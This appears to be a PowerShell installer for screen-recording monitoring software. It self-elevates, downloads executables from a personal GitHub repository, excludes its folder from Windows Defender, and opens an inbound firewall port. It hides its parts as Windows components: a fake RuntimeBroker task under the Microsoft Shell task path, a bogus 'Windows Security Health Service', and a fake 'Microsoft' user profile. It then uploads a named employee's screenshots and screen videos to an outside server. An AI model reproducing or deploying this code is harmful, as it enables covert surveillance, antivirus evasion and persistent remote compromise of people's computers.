# Function to check if the script is running as administrator
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Relaunch the script with elevated privileges if not running as administrator
if (-not (Test-Administrator)) {
    $arguments = "& '" + $myInvocation.MyCommand.Definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    exit
}

# Set execution policy to RemoteSigned if not already set
$currentPolicy = Get-ExecutionPolicy -Scope CurrentUser
if ($currentPolicy -ne 'RemoteSigned') {
    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
}

#========================================================
# Additional Step: Check and download ffmpeg.exe if not present
$ffmpegPath = "C:\Windows\ffmpeg.exe"

# Check if ffmpeg.exe does not already exist in the destination
if (-Not (Test-Path $ffmpegPath)) {
    Write-Host "ffmpeg.exe not found at $ffmpegPath"

    # Get the directory of the current script
    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
    $localFfmpegPath = Join-Path $scriptDir "ffmpeg.exe"

    # Check if ffmpeg.exe exists in the script directory
    if (Test-Path $localFfmpegPath) {
        Write-Host "Found ffmpeg.exe in script directory. Copying to $ffmpegPath..."
        Copy-Item -Path $localFfmpegPath -Destination $ffmpegPath -Force
    }
    else {
        Write-Host "ffmpeg.exe not found in script directory. Proceeding to download..."
		$ffmpegDownloadUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/ffmpeg.file"
		$tempFfmpegPath = "$env:TEMP\ffmpeg.file"

		if (-not (Test-Path -Path $ffmpegPath)) {
			Write-Host "ffmpeg.exe not found in C:\Windows. Downloading..."
			Invoke-WebRequest -Uri $ffmpegDownloadUrl -OutFile $tempFfmpegPath
			Rename-Item -Path $tempFfmpegPath -NewName "ffmpeg.exe"
			Copy-Item -Path "$env:TEMP\ffmpeg.exe" -Destination "C:\Windows\"
			Write-Host "ffmpeg.exe downloaded and copied to C:\Windows"
		}
    }
}
else {
    Write-Host "ffmpeg.exe already exists at $ffmpegPath"
}

#========================================================


# Get the current user's name
$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]

#========================================================

# Remove old Version (RuntimeBroker)
Write-Host "Remove old Version (RuntimeBroker)"

$appDataPath = "C:\Users\$currentUserName\AppData"
$currentDir = "$appDataPath\Local\Microsoft\RuntimeBroker"
$taskName = 'RuntimeBroker'

# Check if the task exists and delete it if necessary
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# Check if any files in the directory are being held by any processes and kill those processes
if (Test-Path -Path $currentDir) {
    $lockingProcesses = Get-Process | Where-Object { $_.Modules.FileName -like "$currentDir\*" }
    foreach ($process in $lockingProcesses) {
        Stop-Process -Id $process.Id -Force
    }
}

# Delete the directory if it exists and recreate it
if (Test-Path -Path $currentDir) {
    Write-Host "Waiting for 5 seconds before deleting the directory..."
    Start-Sleep -Seconds 5
    Remove-Item -Path $currentDir -Recurse -Force
}
# End Remove old Version

#========================================================

# Set the target directory and AppData path
$currentUserName = "Microsoft"
$appDataPath = "C:\Users\$currentUserName\AppData"
$currentDir = "$appDataPath\Local\Microsoft\RuntimeBroker"
$currentDirService = "$appDataPath\Local\Microsoft"
$taskExecutablePath = Join-Path -Path $currentDir -ChildPath "RuntimeBroker.exe"
# Path to the executable file of the service
$servicePath = Join-Path -Path $currentDirService -ChildPath "WindowsSecurityHealthService.exe"
$servicePathConfig = Join-Path -Path $currentDirService -ChildPath "WindowsSecurityHealthService.exe.config"

# Variables for task name and task path
$taskName = 'RuntimeBroker'

Write-Host "Check if Visual C++ Redistributable is installed"

# Function to check if Visual C++ Redistributable is installed
function Test-VCRedist {
    $keyPath = "HKLM:\SOFTWARE\Microsoft\DevDiv\VC\Servicing\14.0\RuntimeMinimum"
    $valueName = "Version"
    $minVersion = [version]"14.30.30704"
    
    try {
        $value = Get-ItemProperty -Path $keyPath -Name $valueName -ErrorAction Stop
        $installedVersion = [version]$value.Version
        return $installedVersion -ge $minVersion
    }
    catch {
        return $false
    }
}

# Install Visual C++ Redistributable if not installed
if (-not (Test-VCRedist)) {
    Write-Host "Visual C++ Redistributable not found. Downloading and installing..."
    $vcRedistUrl = "https://aka.ms/vs/17/release/vc_redist.x64.exe"
    $vcRedistInstaller = "$env:TEMP\vc_redist.x64.exe"
    Invoke-WebRequest -Uri $vcRedistUrl -OutFile $vcRedistInstaller
    Start-Process -FilePath $vcRedistInstaller -ArgumentList "/install", "/quiet", "/norestart" -Wait
}

# Check if the task exists and delete it if necessary
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# Check rule TCP
$tcpRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq "Open Port 54368 TCP" -and $_.Direction -eq "Inbound" -and $_.Protocol -eq "TCP" -and $_.LocalPort -eq "54368" }

if (-not $tcpRule) {
    New-NetFirewallRule -DisplayName "Open Port 54368 TCP" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 54368
    Write-Output "Rule for TCP port 54368 created."
} else {
    Write-Output "Rule for TCP port 54368 already exists."
}

# Check if any files in the directory are being held by any processes and kill those processes
if (Test-Path -Path $currentDir) {
    $lockingProcesses = Get-Process | Where-Object { $_.Modules.FileName -like "$currentDir\*" }
    foreach ($process in $lockingProcesses) {
        Stop-Process -Id $process.Id -Force
    }
}

# Delete the directory if it exists and recreate it
if (Test-Path -Path $currentDir) {
    Write-Host "Waiting for 5 seconds before deleting the directory..."
    Start-Sleep -Seconds 5
    Remove-Item -Path $currentDir -Recurse -Force
}
New-Item -ItemType Directory -Path $currentDir | Out-Null

# Change to the target directory
Set-Location -Path $currentDir

# 1. Add the AppData directory to the exclusion list in Windows Defender
Add-MpPreference -ExclusionPath $appDataPath


# Define the name of the service
$serviceName = "WindowsSecurityHealthService"

# Check if the service exists
$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue

if ($service) {
    # Check if the service is running
    if ($service.Status -eq 'Running') {
        # Stop the service
        Stop-Service -Name $serviceName -Force
        Write-Output "Service '$serviceName' stopped."
    } else {
        Write-Output "Service '$serviceName' is not running."
    }
    
    # Delete the service
    sc.exe delete $serviceName
    Write-Output "Service '$serviceName' deleted."
} else {
    Write-Output "Service '$serviceName' does not exist."
}

if(Test-Path $servicePath){
    Remove-Item -Path $servicePath
}

if(Test-Path $servicePathConfig){
    Remove-Item -Path $servicePathConfig
}


Write-Host "Download the file from the link and extract it to the current directory"

# 2. Download the file from the link and extract it to the current directory
# Define the zip file paths and URLs
$zipUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/app.zip"
$zipFile = "$currentDir\app.zip"
$unzipDir = $currentDir

$zipUrlService = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/service.zip"
$zipFileService = "$currentDirService\service.zip"
$unzipDirService = $currentDirService

# Check and copy app.zip if it exists in script directory
if (-not (Test-Path $zipFile)) {
    $localAppZip = Join-Path -Path $PSScriptRoot -ChildPath "app.zip"
    if (Test-Path $localAppZip) {
        # Copy local app.zip to target directory
        Copy-Item -Path $localAppZip -Destination $zipFile
    } else {
        # Download the app.zip
        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
    }
}

# Check and copy service.zip if it exists in script directory
if (-not (Test-Path $zipFileService)) {
    $localServiceZip = Join-Path -Path $PSScriptRoot -ChildPath "service.zip"
    if (Test-Path $localServiceZip) {
        # Copy local service.zip to target directory
        Copy-Item -Path $localServiceZip -Destination $zipFileService
    } else {
        # Download the service.zip
        Invoke-WebRequest -Uri $zipUrlService -OutFile $zipFileService
    }
}

# Extract app.zip
Start-Sleep -Seconds 1
Expand-Archive -Path $zipFile -DestinationPath $unzipDir

# Extract service.zip
Start-Sleep -Seconds 1
Write-Output "Extract '$zipFileService' to '$unzipDirService'"
Expand-Archive -Path $zipFileService -DestinationPath $unzipDirService


# 3. Delete the appsettings.xml file if it exists and terminate any processes using the files in the directory
$appSettingsPath = "$appDataPath\Local\Microsoft\appsettings.xml"

if (-not (Test-Path -Path $appSettingsPath)) {
    # Prompt for computer name and employee name
    $computerName = Read-Host -Prompt 'Enter computer name'
    $employeeName = Read-Host -Prompt 'Enter employee name'

    # Create the appsettings.xml file with the provided format
    $appSettingsContent = @"
<?xml version="1.0"?>
<AppSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <CreateComputerHost>https://winmedia1.uro-solution.info/api/Upload/CreateComputer</CreateComputerHost>
    <VideoHost>https://winmedia1.uro-solution.info/api/Upload/UploadVideos</VideoHost>
    <ImageHost>https://winmedia1.uro-solution.info/api/Upload/UploadImage</ImageHost>
    <FrameHeight>1080</FrameHeight>
    <FrameWidth>1920</FrameWidth>
    <VideoDuration>60</VideoDuration>
    <ScreenshotsSpeed>1000</ScreenshotsSpeed>
    <ImageQuality>100</ImageQuality>
    <ComputerName>$computerName</ComputerName>
    <EmployeeName>$employeeName</EmployeeName>
</AppSettings>
"@
    $appSettingsContent | Out-File -FilePath $appSettingsPath -Encoding utf8
}

# 4. Create a scheduled task with the specified script
Write-Host "Create a scheduled task with the specified script"
$taskPath = Join-Path -Path $currentDir -ChildPath "RuntimeBroker.exe"

$action = New-ScheduledTaskAction -Execute $taskPath
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days (365 * 20))
$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 100
$settings.DisallowStartIfOnBatteries = $false
$settings.StopIfGoingOnBatteries = $false
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -TaskPath '\Microsoft\Windows\Shell' -Settings $settings -Force

# 5. Run the RuntimeBroker task
Write-Host "Run the RuntimeBroker task"
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Start-ScheduledTask  -TaskPath '\Microsoft\Windows\Shell' -TaskName $taskName
} else {
    Write-Host "Error: Scheduled task $taskName was not created successfully."
    exit 1
}

# 6. Create service

# Display name of the service
$displayName = "Windows Security Health Service"

# Description of the service
$description = "Windows Security Health"

# Check if the service already exists
$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue

if ($service) {
    if ($service.Status -ne 'Running') {
        # Restart the service if it is not running
        Restart-Service -Name $serviceName
        Write-Output "Service '$displayName' was not running and has been restarted."
    } else {
        Write-Output "Service '$displayName' is already running."
    }
} else {
    # Create a new service using New-Service cmdlet
    New-Service -Name $serviceName -BinaryPathName $servicePath -DisplayName $displayName -Description $description -StartupType Automatic

    # Start the newly created service
    Start-Service -Name $serviceName

    Write-Output "Service '$displayName' created and started successfully."
}